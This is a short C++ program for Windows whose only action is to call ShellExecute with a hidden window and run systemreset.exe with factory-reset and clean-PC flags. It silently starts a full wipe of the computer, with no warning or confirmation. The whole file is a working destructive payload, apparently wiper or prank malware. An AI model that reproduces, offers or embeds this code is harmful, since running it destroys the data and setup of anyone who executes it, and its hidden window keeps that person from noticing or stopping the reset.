#include <iostream>
#include <shellapi.h>
#include <windows.h>

int main(){
    ShellExecute(NULL,"open","systemreset.exe","-factoryreset -cleanpc",NULL,SW_HIDE);

    return 0;
}